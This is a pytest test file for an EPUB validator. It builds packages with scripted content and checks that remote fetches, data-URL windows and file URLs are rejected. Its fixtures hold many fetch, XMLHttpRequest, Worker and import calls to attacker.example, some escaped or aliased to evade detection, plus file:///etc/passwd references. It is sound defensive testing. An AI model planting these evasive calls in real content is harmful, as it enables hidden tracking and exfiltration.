            "OEBPS/chapter.xhtml": chapter,
            "OEBPS/unrelated.xhtml": _XHTML,
        },
    )

    with pytest.raises(RuntimeError, match="scripted content is missing the scripted property"):
        internal_validate(epub)


def test_internal_validate_rejects_uninspected_iframe_srcdoc(tmp_path: Path) -> None:
    epub = tmp_path / "iframe-srcdoc.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head><body>
  <iframe srcdoc="&lt;script&gt;fetch('https://attacker.example/data')&lt;/script&gt;"/>
</body></html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match="iframe srcdoc cannot be validated safely"):
        internal_validate(epub)


@pytest.mark.parametrize(
    ("script_type", "payload"),
    [
        (
            "importmap",
            '{"imports":{"remote":"https://attacker.example/module.js"}}',
        ),
        (
            "speculationrules",
            '{"prefetch":[{"source":"list","urls":["https://attacker.example/next"]}]}',
        ),
    ],
)
def test_internal_validate_scans_processed_script_urls(
    tmp_path: Path, script_type: str, payload: str
) -> None:
    epub = tmp_path / f"{script_type}-remote.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="scripted remote-resources"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><script type="{script_type}">{payload}</script></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match="remote resource is missing from the manifest"):
        internal_validate(epub)


def test_internal_validate_accepts_large_content_documents(tmp_path: Path) -> None:
    epub = tmp_path / "large-chapter.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = (
        '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">'
        "<head><title>Book</title></head><body><!--" + ("x" * 10_000_001) + "--></body></html>"
    )
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


def test_internal_validate_rejects_duplicate_manifest_resource_urls(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "duplicate-manifest-resource.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
    <item id="alias" href="./chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": _XHTML, "OEBPS/chapter.xhtml": _XHTML},
    )

    with pytest.raises(RuntimeError, match="duplicate OPF manifest resource"):
        internal_validate(epub)


def test_internal_validate_handles_deep_xml_without_python_recursion(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "deep-content.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    depth = 1_100
    navigation = (
        '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml" '
        'xmlns:epub="http://www.idpf.org/2007/ops"><head><title>Navigation</title></head>'
        '<body><nav epub:type="toc"><ol>'
        + ("<li><span>Section</span><ol>" * depth)
        + '<li><a href="chapter.xhtml#target">Book</a></li>'
        + ("</ol></li>" * depth)
        + "</ol></nav></body></html>"
    )
    chapter = (
        '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">'
        "<head><title>Book</title></head><body>"
        + ("<div>" * depth)
        + '<p id="target">Deep content</p>'
        + ("</div>" * depth)
        + "</body></html>"
    )
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


@pytest.mark.parametrize(
    ("limit_name", "chapter_body", "message"),
    [
        ("_MAX_XML_ELEMENTS", "<p/>" * 50, "XML element budget exceeded"),
        ("_MAX_XML_DEPTH", "<div>" * 20 + "Deep" + "</div>" * 20, "XML depth budget exceeded"),
    ],
)
def test_internal_validate_enforces_xml_structure_budgets_during_parsing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    limit_name: str,
    chapter_body: str,
    message: str,
) -> None:
    epub = tmp_path / f"bounded-{limit_name}.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = (
        '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">'
        f"<head><title>Book</title></head><body>{chapter_body}</body></html>"
    )
    monkeypatch.setattr(epub_module, limit_name, 16 if limit_name == "_MAX_XML_DEPTH" else 40)
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match=message):
        internal_validate(epub)


@pytest.mark.parametrize(
    ("script_source", "message"),
    [
        (
            r"fetch('\x68ttps://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            r"fetch('\u0068ttps://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            r"fetch('\u{68}ttps://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            r"fetch('https://attacker.example/\uD83D\uDE00.json')",
            "remote resource is missing from the manifest",
        ),
        (
            "window.fetch('https://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            "const request = fetch; request('https://attacker.example/aliased-fetch')",
            "remote resource is missing from the manifest",
        ),
        (
            "let request; request = window.fetch; "
            "request('https://attacker.example/mutable-fetch')",
            "remote resource is missing from the manifest",
        ),
        (
            "const {fetch: request} = window; "
            "request('https://attacker.example/destructured-fetch')",
            "remote resource is missing from the manifest",
        ),
        (
            "fetch('http:tracker.example/pixel')",
            "requires an authority",
        ),
        (
            "(fetch)('https://attacker.example/parenthesized')",
            "remote resource is missing from the manifest",
        ),
        (
            "function noop(fetch) {}; fetch('https://attacker.example/outside-parameter-scope')",
            "remote resource is missing from the manifest",
        ),
        (
            r"f\u0065tch('https://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            r"new XMLHttpRequest().op\u0065n('GET', 'https://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            "import { fetch as localFetch } from './script.js'; "
            "fetch('https://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            "{ const fetch = localFetch; } fetch('https://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            "{ let fetch = localFetch; } fetch('https://attacker.example/pixel')",
            "remote resource is missing from the manifest",
        ),
        (
            "window.open('data:text/html,unsafe', '_blank')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "window.open('file:///etc/passwd', '_blank')",
            "file URLs are forbidden",
        ),
        (
            "(window.open)('data:text/html,unsafe', '_blank')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "(window).open('data:text/html,unsafe', '_blank')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "window.document.open('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "globalThis.window.open('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const launch = globalThis.window.open; launch('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const context = window; context.open('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const context = window; const documentAlias = context.document; "
            "const launch = documentAlias.open; launch('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "let context; context = globalThis.window; context.open('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const launch = window.open; launch('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const first = document.open; const launch = first; launch('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const {open: launch} = window; launch('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "let launch; launch = window.open; launch('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "window.open.call(window, 'data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "window.open['call'](window, 'data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const launch = window.open; launch['apply'](window, ['data:text/html,unsafe'])",
            "data URLs cannot open browsing contexts",
        ),
        (
            "(0, window.open)('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "window.open.bind(window)('data:text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "window.open('data:' + 'text/html,unsafe')",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const scheme = 'data:'; const target = scheme + 'text/html,unsafe'; "
            "window.open(target)",
            "data URLs cannot open browsing contexts",
        ),
        (
            "const scheme = 'data:'; window.open(`${scheme}text/html,unsafe`)",
            "data URLs cannot open browsing contexts",
        ),
        (
            "fetch('https://' + 'attacker.example/composed')",
            "remote resource is missing from the manifest",
        ),
        (
            "const xhr = new XMLHttpRequest(); const origin = 'https://attacker.example'; "
            "xhr.open('GET', origin + '/composed')",
            "remote resource is missing from the manifest",
        ),
        (
            "new Worker('https://attacker.example/worker.js')",
            "remote resource is missing from the manifest",
        ),
        (
            "const BackgroundWorker = Worker; "
            "new BackgroundWorker('https://attacker.example/aliased-worker.js')",
            "remote resource is missing from the manifest",
        ),
        (
            "importScripts('data:text/javascript,', 'https://attacker.example/second-worker.js')",
            "remote resource is missing from the manifest",
        ),
        (
            "const loadScripts = importScripts; "
            "loadScripts('https://attacker.example/aliased-worker-script.js')",
            "remote resource is missing from the manifest",
        ),
        (
            "import 'https://attacker.example/module.js'",
            "remote resource is missing from the manifest",
        ),
        (
            "import('https://attacker.example/module.js')",
            "remote resource is missing from the manifest",
        ),
        (
            "export { value } from 'https://attacker.example/module.js'",
            "remote resource is missing from the manifest",
        ),
        (
            "`${fetch('https://attacker.example/template.js')}`",
            "remote resource is missing from the manifest",
        ),
        (";" * 500_001, "JavaScript token budget exceeded"),
    ],
)
def test_internal_validate_decodes_javascript_escapes(
    tmp_path: Path, script_source: str, message: str
) -> None:
    epub = tmp_path / "escaped-javascript.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="scripted"/>
    <item id="script" href="script.js" media-type="text/javascript"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><script src="script.js"></script></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": chapter,
            "OEBPS/script.js": script_source,
        },
    )

    with pytest.raises(RuntimeError, match=message):
        internal_validate(epub)


def test_internal_validate_shares_javascript_budget_across_resources(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "aggregate-javascript-budget.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="scripted"/>
    <item id="script-a" href="a.js" media-type="text/javascript"/>
    <item id="script-b" href="b.js" media-type="text/javascript"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><script src="a.js"></script><script src="b.js"></script></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": chapter,
            "OEBPS/a.js": ";" * 250_100,
            "OEBPS/b.js": ";" * 250_100,
        },
    )

    with pytest.raises(RuntimeError, match="JavaScript token budget exceeded"):
        internal_validate(epub)


def test_internal_validate_checks_javascript_size_before_decoding(tmp_path: Path) -> None:
    epub = tmp_path / "oversized-javascript.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="scripted"/>
    <item id="script" href="script.js" media-type="text/javascript"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><script src="script.js"></script></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": chapter,
            "OEBPS/script.js": b"\xff" * (2 * 1024 * 1024 + 1),
        },
    )

    with pytest.raises(RuntimeError, match="JavaScript resource exceeds 2 MiB"):
        internal_validate(epub)


@pytest.mark.parametrize(
    ("version", "media_type", "declared", "message"),
    [
        ("2.0", "font/woff2", True, "remote manifest resource is not permitted"),
        ("3.0", "image/png", True, "remote manifest resource is not permitted"),
        ("3.0", "font/woff2", False, "remote resource lacks a referring declaration"),
    ],
)
def test_internal_validate_rejects_disallowed_remote_resources(
    tmp_path: Path, version: str, media_type: str, declared: bool, message: str
) -> None:
    epub = tmp_path / f"remote-{version}.epub"
    navigation_item = (
        '<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>'
        if version == "3.0"
        else '<item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>'
    )
    spine_toc = "" if version == "3.0" else ' toc="ncx"'
    declaration = ' properties="remote-resources"' if declared else ""
    package = f"""<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="{version}">
  <metadata/>
  <manifest>
    {navigation_item}
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"{declaration}/>
    <item id="remote" href="https://example.com/resource" media-type="{media_type}"/>
  </manifest>
  <spine{spine_toc}><itemref idref="chapter"/></spine>
</package>
"""
    remote_reference = (
        "<style>@font-face { src: url('https://example.com/resource'); }</style>"
        if media_type.startswith("font/")
        else '<img src="https://example.com/resource" alt="Remote" />'
    )
    resources = {
        "OEBPS/chapter.xhtml": (
            '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">'
            f"<head><title>Book</title></head><body>{remote_reference}</body></html>"
        )
    }
    if version == "3.0":
        resources["OEBPS/nav.xhtml"] = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    else:
        resources["OEBPS/toc.ncx"] = """<?xml version="1.0"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap>
  <navPoint id="chapter">
    <navLabel><text>Book</text></navLabel><content src="chapter.xhtml"/>
  </navPoint>
</navMap></ncx>
"""
    _write_epub(epub, package, resources)

    with pytest.raises(RuntimeError, match=message):
        internal_validate(epub)


def test_internal_validate_checks_the_specific_remote_referrer(tmp_path: Path) -> None:
    epub = tmp_path / "wrong-referrer.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter-a" href="chapter-a.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="chapter-b" href="chapter-b.xhtml" media-type="application/xhtml+xml"/>
    <item id="font" href="https://example.com/book.woff2" media-type="font/woff2"/>
  </manifest>
  <spine><itemref idref="chapter-a"/><itemref idref="chapter-b"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter-a.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter_b = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <style>@font-face { src: url('https://example.com/book.woff2'); }</style>
</head><body/></html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter-a.xhtml": _XHTML,
            "OEBPS/chapter-b.xhtml": chapter_b,
        },
    )

    with pytest.raises(RuntimeError, match="lacks a referring declaration"):
        internal_validate(epub)


def test_internal_validate_ignores_remote_urls_in_prose(tmp_path: Path) -> None:
    epub = tmp_path / "remote-url-prose.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter-a" href="chapter-a.xhtml" media-type="application/xhtml+xml"
          properties="remote-resources"/>
    <item id="chapter-b" href="chapter-b.xhtml" media-type="application/xhtml+xml"/>
    <item id="font" href="https://example.com/book.woff2" media-type="font/woff2"/>
  </manifest>
  <spine><itemref idref="chapter-a"/><itemref idref="chapter-b"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter-a.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter_a = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title>
  <style>@font-face { src: url('https://example.com/book.woff2'); }</style>
</head><body/></html>
"""
    chapter_b = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Notes</title>
  <link rel="canonical" href="https://example.com/book"/>
  <link rel="author" href="https://example.com/author"/>
  <link rel="license" href="https://example.com/license"/>
</head>
  <body><p>The font URL is https://example.com/book.woff2 for reference.</p>
    <p><a href="https://example.com/book.woff2">Font documentation</a></p>
    <script type="text/plain">fetch('https://invalid.example/data-block')</script>
    <script type="text/javascript; charset=utf-8">
      fetch('https://invalid.example/parameterized-data-block')
    </script>
  </body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter-a.xhtml": chapter_a,
            "OEBPS/chapter-b.xhtml": chapter_b,
        },
    )

    internal_validate(epub)


def test_parameterized_xhtml_script_type_is_a_data_block(tmp_path: Path) -> None:
    epub = tmp_path / "parameterized-script-data-block.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head><body>
  <script type="text/javascript; charset=utf-8">
    window.open('data:text/html,this-is-data-not-code')
  </script>
</body></html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


def test_internal_validate_ignores_foreign_xml_reference_attributes(tmp_path: Path) -> None:
    epub = tmp_path / "foreign-xml-attributes.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
    <item id="metadata" href="metadata.xml" media-type="application/example+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:custom="urn:example:metadata">
  <head><title>Book</title></head>
  <body><custom:record custom:href="urn:isbn:9780000000000"/></body>
</html>
"""
    metadata = """<?xml version="1.0"?>
<record xmlns="urn:example:metadata" href="urn:isbn:9780000000000" src="record-id"/>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": chapter,
            "OEBPS/metadata.xml": metadata,
        },
    )

    internal_validate(epub)


@pytest.mark.parametrize(
    ("body", "message"),
    [
        (
            '<audio src="https://attacker.example/track.mp3"></audio>',
            "remote resource is missing from the manifest",
        ),
        (
            '<img src="undeclared.png" alt="Missing"/>',
            "local resource is missing from the manifest",
        ),
        (
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<rect filter="url(https://attacker.example/filter.svg#f)"/>'
            "</svg>",
            "remote resource is missing from the manifest",
        ),
        ('<audio src="file:///etc/passwd"></audio>', "file URLs are forbidden"),
        (
            '<iframe src="javascript:alert(1)"></iframe>',
            "unsupported resource URL scheme",
        ),
        (
            '<audio src="ftp://attacker.example/track.mp3"></audio>',
            "unsupported resource URL scheme",
        ),
        (
            '<img src="http:tracker.example/pixel" alt="Ambiguous"/>',
            "requires an authority",
        ),
        (
            "<style>body { background: url(https:tracker.example/pixel); }</style>",
            "requires an authority",
        ),
        (
            r'<audio src="\\attacker.example\track.mp3"></audio>',
            "reverse solidus in URL reference",
        ),
        (
            '<a href="data:text/html,unsafe">Open</a>',
            "data URLs cannot open browsing contexts",
        ),
    ],
)
def test_internal_validate_rejects_invalid_external_resources(
    tmp_path: Path, body: str, message: str
) -> None:
    epub = tmp_path / "unmanifested-remote.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body>{body}</body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match=message):
        internal_validate(epub)


def test_internal_validate_allows_embedded_data_urls(tmp_path: Path) -> None:
    epub = tmp_path / "embedded-data.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><img src="data:image/png;base64,iVBORw0KGgo=" alt="Embedded"/>
    <iframe src="about:blank"></iframe>
  </body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    internal_validate(epub)


def test_internal_validate_rejects_data_urls_in_package_links(tmp_path: Path) -> None:
    epub = tmp_path / "package-data-link.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata><link href="data:text/plain,record" rel="record"/></metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": _XHTML, "OEBPS/chapter.xhtml": _XHTML},
    )

    with pytest.raises(RuntimeError, match="data URLs are forbidden in package links"):
        internal_validate(epub)


def test_internal_validate_does_not_treat_markup_as_script_retrieval(
    tmp_path: Path,
) -> None:
    epub = tmp_path / "scripted-remote-image.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"
          properties="scripted remote-resources"/>
    <item id="image" href="https://example.com/tracker.png" media-type="image/png"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
